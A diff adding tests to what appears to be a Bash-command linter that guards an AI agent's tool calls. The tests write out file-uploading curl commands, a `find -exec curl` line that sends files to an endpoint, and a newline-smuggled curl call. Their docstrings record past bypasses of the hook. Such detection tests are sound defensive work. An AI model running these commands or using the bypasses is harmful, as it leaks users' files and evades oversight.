@@ -817,3 +817,28 @@ class TestBashAuditFindings:
         ):
             r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
             assert r.returncode == 2, f"{cmd!r} was not blocked"
+
+    def test_openai_responses_endpoint_is_blocked(self):
+        """External finding: the OpenAI rule matched (chat/)?completions but not
+        the official POST /v1/responses endpoint."""
+        for cmd in (
+            "curl -X POST https://api.openai.com/v1/responses -d @in.json",
+            "curl -X POST https://api.openai.com/v1/chat/completions -d @in.json",
+            "curl -X POST https://api.openai.com/v1/completions -d @in.json",
+        ):
+            r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
+            assert r.returncode == 2, f"{cmd!r} was not blocked"
+
+    def test_find_exec_is_not_a_search(self):
+        """External finding: `find` carries no chain token yet executes an
+        arbitrary command — it was never a read-only verb."""
+        cmd = f"find . -exec curl -X POST {self._ENDPOINT} {{}} +"
+        r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
+        assert r.returncode == 2
+
+    def test_newline_is_a_command_separator(self):
+        """A line feed separates commands just like `;` — a search on one line
+        must not exempt the call on the next."""
+        cmd = f"rg needle src/\ncurl -X POST {self._ENDPOINT}"
+        r = _run_linter({"tool_name": "Bash", "tool_input": {"command": cmd}})
+        assert r.returncode == 2
